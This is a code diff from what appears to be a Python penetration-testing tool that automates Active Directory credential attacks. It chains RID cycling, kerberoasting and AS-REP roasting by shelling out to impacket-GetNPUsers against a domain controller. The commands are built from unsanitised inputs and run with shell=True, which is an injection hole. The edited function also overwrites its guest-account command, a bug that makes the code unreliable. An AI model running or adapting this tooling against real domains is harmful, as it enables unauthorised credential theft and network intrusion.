@@ -153,6 +153,8 @@ def check_smb_credentials(target, domain):
         user, passwd = cred.split(':')[:2]
         #print('check kerberoast with creds')
         check_kerberoast(target, domain, user, passwd)
+        #print('try to regenerate smb_users.txt file using creds before asreproast')
+        rid_cycling(target=target, domain=domain)
         #print('check asreproast with creds')
         check_asreproast(target, domain, user, passwd)
         return True
@@ -161,13 +163,12 @@ def check_smb_credentials(target, domain):
 
 def check_asreproast(target, domain, user='Guest', passw=''):
     # NULL
-    if (user == 'Guest'):
-        filename = 'smb_users.txt'
-        if not (os.path.exists(filename)): return
-
+    filename = 'smb_users.txt'
+    if not (os.path.exists(filename)): return
+    if (user == 'Guest'):        
         cmd = f'impacket-GetNPUsers -no-pass {domain}/guest -dc-ip {target} -usersfile {filename}'
     # Creds
-    cmd = f'impacket-GetNPUsers {domain}/{user}:{passw} -dc-ip {target}'
+    cmd = f'impacket-GetNPUsers {domain}/{user}:{passw} -dc-ip {target} -usersfile {filename}'
     
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
@@ -200,6 +201,8 @@ def bruteforce_kerberos_users(target, domain):
 
 
 def handle_kerberos(target, domain):
+    #printc('kerberos', RED)
+
     if (len(domain) < 3): return
     rid_cycling(target=target, domain=domain)
     if os.path.exists('smb_users.txt'):
